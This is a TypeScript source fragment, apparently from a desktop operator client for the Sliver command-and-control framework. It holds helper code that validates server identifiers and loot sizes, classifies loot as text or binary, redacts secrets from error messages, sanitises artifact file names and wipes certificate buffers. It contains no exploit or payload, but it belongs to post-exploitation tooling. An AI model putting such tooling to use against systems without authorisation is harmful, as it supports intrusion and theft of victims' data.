  if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/iu.test(value)) {
    throw new Error(`The server returned an invalid ${label} identifier`);
  }
  return value;
}

function boundedServerText(value: string, maximum: number): string {
  return boundedText(value, maximum);
}

function decimalByteSize(value: string): bigint {
  if (!/^(0|[1-9][0-9]{0,19})$/u.test(value)) throw new Error("The server returned an invalid loot size");
  return BigInt(value);
}

function isProbablyTextLoot(data: Uint8Array): boolean {
  try {
    const decoded = new TextDecoder("utf-8", { fatal: true }).decode(data);
    if (decoded.includes("\0")) return false;
    let controls = 0;
    for (const character of decoded) {
      const code = character.codePointAt(0) ?? 0;
      if ((code < 32 && character !== "\n" && character !== "\r" && character !== "\t") || code === 127) {
        controls += 1;
      }
    }
    return controls <= Math.max(1, Math.floor(decoded.length / 100));
  } catch {
    return false;
  }
}

function clipboardDigest(value: string): string {
  return createHash("sha256").update(value, "utf8").digest("hex");
}

function sameNetworkAddress(left: NetworkAddress | null, right: NetworkAddress | null): boolean {
  return left === null
    ? right === null
    : right !== null && left.host === right.host && left.port === right.port;
}

function errorMessage(error: unknown): string {
  const localFileError = localFileSystemErrorMessage(error);
  if (localFileError) return localFileError;
  const message = error instanceof Error ? error.message : "An unexpected operation error occurred";
  return boundedText(
    message
      // Node appends a system-trust fallback to certificate-chain failures.
      // Operator RPC trust is intentionally pinned to the CA embedded in the
      // Sliver configuration, so that suggestion is inapplicable and unsafe.
      .replace(
        /;\s*if the root CA is installed locally,\s*try running Node\.js with --use-system-ca/giu,
        "",
      )
      .replace(/-----BEGIN [^-]*PRIVATE KEY-----[\s\S]*/giu, "[redacted private key]")
      .replace(/\b(bearer\s+)[^\s,;]+/giu, "$1[redacted]")
      .replace(
        /\b(token|password|secret|private[_ -]?key|authorization)(\s*[:=]\s*)[^\s,;]+/giu,
        "$1$2[redacted]",
      )
      .replace(/\/\/[^/@\s]+@/gu, "//[redacted]@"),
    MAX_SUMMARY_TEXT,
  );
}

function localFileSystemErrorMessage(error: unknown): string | undefined {
  if (!(error instanceof Error)) return undefined;
  const candidate = error as NodeJS.ErrnoException & { path?: unknown; dest?: unknown };
  const code = typeof candidate.code === "string" ? candidate.code : "";
  const fileSystemCodes = new Set([
    "EACCES", "EBUSY", "EEXIST", "EFBIG", "EISDIR", "ELOOP", "EMFILE", "ENAMETOOLONG",
    "ENFILE", "ENOENT", "ENOSPC", "ENOTDIR", "ENOTEMPTY", "EPERM", "EROFS", "EXDEV",
  ]);
  // gRPC errors also expose a `path` containing the RPC method name. Only a
  // native filesystem error code is authoritative enough to classify here.
  if (!fileSystemCodes.has(code)) return undefined;
  if (code === "ENOENT" || code === "ENOTDIR") return "A required local file is no longer available";
  if (code === "EACCES" || code === "EPERM" || code === "EROFS") {
    return "A local file operation was denied by the operating system";
  }
  if (code === "ENOSPC") return "The selected destination does not have enough free space";
  return "A local file operation failed";
}

function safeArtifactFileName(value: string): string {
  const leaf = basename(value.replaceAll("\\", "/"));
  let safe = boundedText(leaf, 180)
    .replace(/[<>:"/\\|?*]/gu, "_")
    .replace(/[. ]+$/gu, "")
    .trim();
  while (Buffer.byteLength(safe, "utf8") > 180) safe = [...safe].slice(0, -1).join("");
  if (!safe || safe === "." || safe === "..") return "sliver-artifact.bin";
  return safe;
}

function assertNever(value: never): never {
  throw new Error(`Unexpected listener input: ${String(value)}`);
}

function requireOwnerWindow(sender: WebContents): BrowserWindow {
  if (sender.isDestroyed()) throw new Error("The application window is no longer available");
  const owner = BrowserWindow.fromWebContents(sender);
  if (!owner || owner.isDestroyed()) throw new Error("The application window is no longer available");
  return owner;
}

function clearCertificatePairs(pairs: Map<string, CertificatePair>): void {
  for (const pair of pairs.values()) clearCertificatePair(pair);
  pairs.clear();
}

function clearCertificateCapabilities(context: WindowContext): void {
  for (const timer of context.certificateTimers.values()) clearTimeout(timer);
  context.certificateTimers.clear();
  clearCertificatePairs(context.certificatePairs);
}

function clearCertificatePair(pair: CertificatePair): void {
  pair.cert.fill(0);
  pair.key.fill(0);
}
